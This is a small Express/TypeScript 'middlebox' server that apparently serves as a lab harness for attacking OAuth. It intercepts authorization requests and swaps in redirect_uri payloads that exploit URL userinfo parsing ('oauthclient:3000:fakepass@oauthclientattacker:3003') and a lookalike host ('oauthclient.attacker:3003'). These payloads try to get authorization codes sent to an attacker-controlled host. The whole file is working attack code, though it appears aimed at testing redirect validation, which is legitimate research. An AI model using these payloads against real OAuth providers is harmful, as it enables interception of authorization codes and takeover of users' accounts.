import express from "express";

const app = express();

var count = 0;

app.get("/oauth/authorize", (req, res) => {
    const payloads = [
        "http://oauthclient:3000:fakepass@oauthclientattacker:3003",
        "http://oauthclient.attacker:3003"
    ];

    const redirect_uri = payloads[count];

    const params = new URLSearchParams({
        ...(req.query as Record<string, string>),
        redirect_uri,
    });

    console.log("using payload:", redirect_uri);
    count++;
    if(count == payloads.length) {
        count =0;
    }
    res.redirect(`http://localhost:3001/oauth/authorize?${params}`);
});


app.listen(8080, () => console.log("Middlebox running on :8080"));
